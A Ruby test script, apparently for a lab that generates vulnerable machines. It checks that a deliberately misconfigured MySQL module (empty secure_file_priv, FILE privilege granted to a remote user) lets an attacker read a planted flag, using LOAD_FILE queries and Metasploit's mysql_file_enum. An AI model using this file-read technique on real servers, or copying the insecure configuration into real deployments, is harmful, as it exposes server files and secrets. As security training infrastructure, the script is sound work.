require_relative '../../../../../lib/post_provision_test'

class MysqlFilePrivEnumTest < PostProvisionTest
  # MySQL/MariaDB port is fixed by the required mysql service module (3306); this
  # module declares no port read_fact, so the port is referenced directly.
  MYSQL_PORT = 3306

  def initialize
    self.module_name = 'mysql_file_priv_enum'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super

    # Resolved inputs — the test must hold for any parameterised deployment.
    username  = self.json_inputs['username']&.first
    password  = self.json_inputs['password']&.first
    enum_db   = self.json_inputs['enum_database']&.first
    storage   = self.json_inputs['storage_directory']&.first
    filename  = (self.json_inputs['leaked_filenames'] || []).first
    flag_text = (self.json_inputs['strings_to_leak'] || []).first
    flag_path = (storage && filename) ? "#{storage}/#{filename}" : nil

    tier(1) do
      test_local_command('mariadb/mysql server installed',
                         'dpkg -l | grep -E "^ii\s+(mysql|mariadb)-server"', 'server')
      # The misconfiguration override is present with an empty secure_file_priv.
      test_local_command('empty secure_file_priv override present',
                         'grep -E "^secure_file_priv" /etc/mysql/conf.d/secgen_file_priv.cnf', 'secure_file_priv')
      if username
        # FILE privilege is granted to the remote account (checked via root's
        # local socket login, which the mysql module sets up).
        test_local_command("FILE privilege granted to #{username}",
                           "mysql -N -e \"SELECT File_priv FROM mysql.user WHERE User='#{username}' AND Host='%'\"", 'Y')
      end
      if flag_path
        test_local_command('flag planted and server-readable',
                           "test -r #{Shellwords.escape(flag_path)} && echo present", 'present')
      end
    end

    tier(2) do
      test_service_up(port: MYSQL_PORT)
      if username && password
        # The account authenticates over TCP (not just the local socket), which
        # is how the attacker VM reaches it. MYSQL_PWD avoids the insecure
        # password-on-command-line warning.
        test_local_command("#{username} authenticates over the network",
                           "MYSQL_PWD=#{Shellwords.escape(password)} mysql -u #{Shellwords.escape(username)} " \
                           "-h 127.0.0.1 -P #{MYSQL_PORT} -N -e 'SELECT 1'", '1')
        if flag_path && flag_text
          # The account reads an arbitrary file via LOAD_FILE — proves FILE
          # privilege plus the empty secure_file_priv together, without an
          # attacker VM.
          test_local_command('LOAD_FILE reads the planted flag',
                             "MYSQL_PWD=#{Shellwords.escape(password)} mysql -u #{Shellwords.escape(username)} " \
                             "-h 127.0.0.1 -P #{MYSQL_PORT} -N -e \"SELECT LOAD_FILE('#{flag_path}')\"",
                             flag_text)
        end
      end
    end

    # Tier 3: prove the file read from the attacker VM with the stock MSF
    # auxiliary. It gives no shell (privilege is info_leak), so test_msf_exploit
    # doesn't apply — run_msf_module drives it and the caller asserts on output.
    # mysql_file_enum reads a wordlist of paths (FILE_LIST, on the attacker) and
    # reports which the server can read. The list holds the planted flag path
    # plus a definitely-absent control path: a genuine read reports the flag and
    # not the control, which is robust to the exact wording of the finding line.
    tier(3) do
      next unless username && password && enum_db && flag_path

      resolved = resolve_attacker('auxiliary/scanner/mysql/mysql_file_enum', nil, nil, 3)
      next unless resolved
      attacker, _attacker_ip, rhost = resolved

      control_path = "#{storage}/secgen_absent_#{rand(1_000_000)}.flag"
      list_path = '/tmp/secgen_mysql_file_enum_list.txt'
      run_on_system(attacker, "printf '%s\\n%s\\n' #{Shellwords.escape(flag_path)} " \
                              "#{Shellwords.escape(control_path)} > #{list_path}")

      aux = run_msf_module('auxiliary/scanner/mysql/mysql_file_enum',
                           attacker: attacker, rhost: rhost,
                           options: { 'USERNAME' => username, 'PASSWORD' => password,
                                      'DATABASE_NAME' => enum_db, 'FILE_LIST' => list_path,
                                      'RPORT' => MYSQL_PORT, 'VERBOSE' => false },
                           label: 'mysql file enum')
      next unless aux

      out = aux[:msf_output].to_s
      if out.include?(flag_path) && !out.include?(control_path)
        pass_check('mysql_file_enum reveals the planted path',
                   "File read confirmed: mysql_file_enum on #{attacker} enumerated #{flag_path} " \
                   "through the FILE privilege on #{rhost}:#{MYSQL_PORT} and not the absent control path",
                   tier: 3)
      else
        fail_check('mysql_file_enum reveals the planted path',
                   "mysql_file_enum did not report the planted path as expected. " \
                   "See msf_output_mysql_file_enum evidence.",
                   tier: 3)
      end
    end

    # Inputs all checked above: username, password, enum_database, storage_directory,
    # leaked_filenames and strings_to_leak each drive an assertion.
  end
end

MysqlFilePrivEnumTest.new.run
